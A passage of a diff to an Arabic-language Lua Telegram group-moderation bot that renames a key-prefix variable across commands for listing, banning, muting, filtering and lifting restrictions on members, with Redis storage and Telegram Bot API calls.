+local List = DevALI:smembers(JENRAL..'ALI:Muted:'..msg.chat_id_)
 text = "⌁︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6388,12 +6376,12 @@ text = "⌁︙*لا يوجد مكتومين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المقيدين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Tkeed:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Tkeed:'..msg.chat_id_)
 text = "⌁︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6404,12 +6392,12 @@ text = "⌁︙*لا يوجد مقيدين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Ban:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Ban:'..msg.chat_id_)
 text = "⌁︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6421,7 +6409,7 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "قائمه المنع" and ChCheck(msg) then
-local List = DevALI:hkeys(Jenral..'ALI:Filters:'..msg.chat_id_)
+local List = DevALI:hkeys(JENRAL..'ALI:Filters:'..msg.chat_id_)
 text = "⌁︙قائمة المنع ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k, v in pairs(List) do
 text = text..k..'~ ❨ '..v..' ❩\n'
@@ -6432,12 +6420,12 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
-local List = DevALI:smembers(Jenral..'User:Donky:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'User:Donky:'..msg.chat_id_)
 text = "⌁︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6448,12 +6436,12 @@ text = "⌁︙*لا يوجد مطايه كلها اوادم* 😹💔"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المطورين الثانويين" and SecondSudo(msg) or text == "الثانويين" and SecondSudo(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:SecondSudo:')
+local List = DevALI:smembers(JENRAL..'ALI:SecondSudo:')
 text = "⌁︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6464,15 +6452,15 @@ text = "⌁︙*عذرا لم يتم رفع اي مطورين ثانويين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if SudoBot(msg) then
 if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌁" and ChCheck(msg) then 
-local BanAll = DevALI:smembers(Jenral..'ALI:BanAll:')
-local MuteAll = DevALI:smembers(Jenral..'ALI:MuteAll:')
+local BanAll = DevALI:smembers(JENRAL..'ALI:BanAll:')
+local MuteAll = DevALI:smembers(JENRAL..'ALI:MuteAll:')
 if #BanAll ~= 0 then 
 text = "⌁︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(BanAll) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6484,7 +6472,7 @@ end
 if #MuteAll ~= 0 then 
 text = text.."⌁︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(MuteAll) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6500,13 +6488,13 @@ text = "⌁︙*لم يتم حظر او كتم اي عضو*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ⌁" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:SudoBot:')
+local List = DevALI:smembers(JENRAL..'ALI:SudoBot:')
 text = "⌁︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local sudouser = DevALI:get(Jenral..'ALI:Sudos'..v) 
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local sudouser = DevALI:get(JENRAL..'ALI:Sudos'..v) 
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
 else
@@ -6517,12 +6505,12 @@ text = "⌁︙*عذرا لم يتم رفع اي مطورين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المدراء العامين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:ManagerAll:')
+local List = DevALI:smembers(JENRAL..'ALI:ManagerAll:')
 text = "⌁︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6533,12 +6521,12 @@ text = "⌁︙*لا يوجد مدراء عامين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:VipAll:')
+local List = DevALI:smembers(JENRAL..'ALI:VipAll:')
 text = "⌁︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6549,13 +6537,13 @@ text = "⌁︙*لا يوجد مميزين عام*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
---     Source Jenral     -- 
+--     Source JENRAL     -- 
 if text == "الادمنيه العامين" and ChCheck(msg) then 
 local ALI =  'ALI:AdminAll:'
-local List = DevALI:smembers(Jenral..ALI)
+local List = DevALI:smembers(JENRAL..ALI)
 text = "⌁︙قائمة الادمنيه العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6566,7 +6554,7 @@ text = "⌁︙*لا يوجد ادمنيه عامين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end  
---     Source Jenral     --
+--     Source JENRAL     --
 if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local admins = data.members_
@@ -6582,54 +6570,54 @@ return false
 end
 local UserName = (dp.username_ or "GENRALTEAM")
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
-DevALI:sadd(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,dp.id_)
+DevALI:sadd(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,dp.id_)
 end,nil)   
 end,nil)   
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
 function filter_by_reply(extra, result, success) 
 if result.content_.sticker_ then
 local idsticker = result.content_.sticker_.sticker_.persistent_id_
-DevALI:sadd(Jenral.."ALI:FilterSteckr"..msg.chat_id_,idsticker)
+DevALI:sadd(JENRAL.."ALI:FilterSteckr"..msg.chat_id_,idsticker)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
 return false
 end
 if result.content_.ID == "MessagePhoto" then
 local photo = result.content_.photo_.id_
-DevALI:sadd(Jenral.."ALI:FilterPhoto"..msg.chat_id_,photo)
+DevALI:sadd(JENRAL.."ALI:FilterPhoto"..msg.chat_id_,photo)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
 return false
 end
 if result.content_.animation_ then
 local idanimation = result.content_.animation_.animation_.persistent_id_
-DevALI:sadd(Jenral.."ALI:FilterAnimation"..msg.chat_id_,idanimation)
+DevALI:sadd(JENRAL.."ALI:FilterAnimation"..msg.chat_id_,idanimation)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
 return false
 end
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
 function unfilter_by_reply(extra, result, success) 
 if result.content_.sticker_ then
 local idsticker = result.content_.sticker_.sticker_.persistent_id_
-DevALI:srem(Jenral.."ALI:FilterSteckr"..msg.chat_id_,idsticker)
+DevALI:srem(JENRAL.."ALI:FilterSteckr"..msg.chat_id_,idsticker)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
 return false
 end
 if result.content_.ID == "MessagePhoto" then
 local photo = result.content_.photo_.id_
-DevALI:srem(Jenral.."ALI:FilterPhoto"..msg.chat_id_,photo)
+DevALI:srem(JENRAL.."ALI:FilterPhoto"..msg.chat_id_,photo)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
 return false
 end
 if result.content_.animation_.animation_ then
 local idanimation = result.content_.animation_.animation_.persistent_id_
-DevALI:srem(Jenral.."ALI:FilterAnimation"..msg.chat_id_,idanimation)
+DevALI:srem(JENRAL.."ALI:FilterAnimation"..msg.chat_id_,idanimation)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
 return false
 end
@@ -6637,18 +6625,18 @@ end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل تحويل الصيغ'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Thwel:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل تحويل الصيغ'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Thwel:ALI'..msg.chat_id_) 
 end
 if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل تحويل الصيغ'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Thwel:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل تحويل الصيغ'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Thwel:ALI'..msg.chat_id_,true)  
 end
-if text == 'تحويل' and not DevALI:get(Jenral..'ALI:Thwel:ALI'..msg.chat_id_) and SourceCh(msg) then  
+if text == 'تحويل' and not DevALI:get(JENRAL..'ALI:Thwel:ALI'..msg.chat_id_) and SourceCh(msg) then  
 if tonumber(msg.reply_to_message_id_) > 0 then 
 function ThwelByReply(extra, result, success)
 if result.content_.photo_ then 
@@ -6679,21 +6667,21 @@ end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
 function id_by_reply(extra, result, success) 
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
-local user_nkt = tonumber(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..data.id_) or 0)
-if DevALI:sismember(Jenral..'ALI:BanAll:',result.sender_user_id_) then
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
+local user_nkt = tonumber(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..data.id_) or 0)
+if DevALI:sismember(JENRAL..'ALI:BanAll:',result.sender_user_id_) then
 Tkeed = 'محظور عام'
-elseif DevALI:sismember(Jenral..'ALI:MuteAll:',result.sender_user_id_) then
+elseif DevALI:sismember(JENRAL..'ALI:MuteAll:',result.sender_user_id_) then
 Tkeed = 'مكتوم عام'
-elseif DevALI:sismember(Jenral..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'محظور'
-elseif DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مكتوم'
-elseif DevALI:sismember(Jenral..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6703,8 +6691,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevALI:sismember(Jenral..'ALI:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(Jenral..'ALI:Sudos'..result.sender_user_id_) or 0)..'' 
+if DevALI:sismember(JENRAL..'ALI:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(JENRAL..'ALI:Sudos'..result.sender_user_id_) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6745,17 +6733,17 @@ end
 return false  end
 if res.id_ then  
 tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
-local user_nkt = tonumber(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..res.id_) or 0)
-if DevALI:sismember(Jenral..'ALI:BanAll:',res.id_) then
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
+local user_nkt = tonumber(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..res.id_) or 0)
+if DevALI:sismember(JENRAL..'ALI:BanAll:',res.id_) then
 Tkeed = 'محظور عام'
-elseif DevALI:sismember(Jenral..'ALI:MuteAll:',res.id_) then
+elseif DevALI:sismember(JENRAL..'ALI:MuteAll:',res.id_) then
 Tkeed = 'مكتوم عام'
-elseif DevALI:sismember(Jenral..'ALI:Ban:'..msg.chat_id_,res.id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Ban:'..msg.chat_id_,res.id_) then
 Tkeed = 'محظور'
-elseif DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_,res.id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_,res.id_) then
 Tkeed = 'مكتوم'
-elseif DevALI:sismember(Jenral..'ALI:Tkeed:'..msg.chat_id_,res.id_) then
+elseif DevALI:sismember(JENRAL..'ALI:Tkeed:'..msg.chat_id_,res.id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6765,8 +6753,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevALI:sismember(Jenral..'ALI:SudoBot:',res.id_) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(Jenral..'ALI:Sudos'..res.id_) or 0)..'' 
+if DevALI:sismember(JENRAL..'ALI:SudoBot:',res.id_) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(JENRAL..'ALI:Sudos'..res.id_) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6791,17 +6779,17 @@ if data.message_ == "User not found" then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
 return false  
 end
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
-local user_nkt = tonumber(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..iduser) or 0)
-if DevALI:sismember(Jenral..'ALI:BanAll:',iduser) then
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
+local user_nkt = tonumber(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..iduser) or 0)
+if DevALI:sismember(JENRAL..'ALI:BanAll:',iduser) then
 Tkeed = 'محظور عام'
-elseif DevALI:sismember(Jenral..'ALI:MuteAll:',iduser) then
+elseif DevALI:sismember(JENRAL..'ALI:MuteAll:',iduser) then
 Tkeed = 'مكتوم عام'
-elseif DevALI:sismember(Jenral..'ALI:Ban:'..msg.chat_id_,iduser) then
+elseif DevALI:sismember(JENRAL..'ALI:Ban:'..msg.chat_id_,iduser) then
 Tkeed = 'محظور'
-elseif DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_,iduser) then
+elseif DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_,iduser) then
 Tkeed = 'مكتوم'
-elseif DevALI:sismember(Jenral..'ALI:Tkeed:'..msg.chat_id_,iduser) then
+elseif DevALI:sismember(JENRAL..'ALI:Tkeed:'..msg.chat_id_,iduser) then
 Tkeed = 'مقيد'
 else
 Tkeed = false
@@ -6811,8 +6799,8 @@ Tked = '\n⌁︙القيود ↫ '..Tkeed
 else 
 Tked = '' 
 end
-if DevALI:sismember(Jenral..'ALI:SudoBot:',iduser) and SudoBot(msg) then
-sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(Jenral..'ALI:Sudos'..iduser) or 0)..'' 
+if DevALI:sismember(JENRAL..'ALI:SudoBot:',iduser) and SudoBot(msg) then
+sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevALI:get(JENRAL..'ALI:Sudos'..iduser) or 0)..'' 
 else 
 sudobot = '' 
 end
@@ -6833,14 +6821,14 @@ end
 end,nil)
 return false 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
 function kshf_by_reply(extra, result, success)
-if DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if DevALI:sismember(Jenral..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
-if DevALI:sismember(Jenral..'ALI:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if DevALI:sismember(Jenral..'ALI:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if DevALI:sismember(Jenral..'ALI:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+if DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if DevALI:sismember(JENRAL..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
+if DevALI:sismember(JENRAL..'ALI:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if DevALI:sismember(JENRAL..'ALI:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if DevALI:sismember(JENRAL..'ALI:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
@@ -6849,11 +6837,11 @@ if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(
 local username = text:match('^كشف القيود @(.*)') 
 function kshf_by_username(extra, result, success)
 if result.id_ then
-if DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
-if DevALI:sismember(Jenral..'ALI:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
-if DevALI:sismember(Jenral..'ALI:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
-if DevALI:sismember(Jenral..'ALI:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
-if DevALI:sismember(Jenral..'ALI:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
+if DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
+if DevALI:sismember(JENRAL..'ALI:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
+if DevALI:sismember(JENRAL..'ALI:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
+if DevALI:sismember(JENRAL..'ALI:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
+if DevALI:sismember(JENRAL..'ALI:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
@@ -6863,24 +6851,24 @@ resolve_username(username,kshf_by_username)
 end
 if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
 function unbanreply(extra, result, success) 
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then  
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(Jenral..'ALI:BanAll:',result.sender_user_id_) DevALI:srem(Jenral..'ALI:MuteAll:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(JENRAL..'ALI:BanAll:',result.sender_user_id_) DevALI:srem(JENRAL..'ALI:MuteAll:',result.sender_user_id_)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) 
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,result.sender_user_id_) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,result.sender_user_id_) 
 end
 end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
 end
 if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
 local user = text:match('رفع القيود (%d+)') 
-if tonumber(user) == tonumber(Jenral) then  
+if tonumber(user) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
@@ -6892,10 +6880,10 @@ end
 ReplyStatus(msg,user,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,user) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,user) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,user) DevALI:srem(Jenral..'ALI:BanAll:',user) DevALI:srem(Jenral..'ALI:MuteAll:',user)
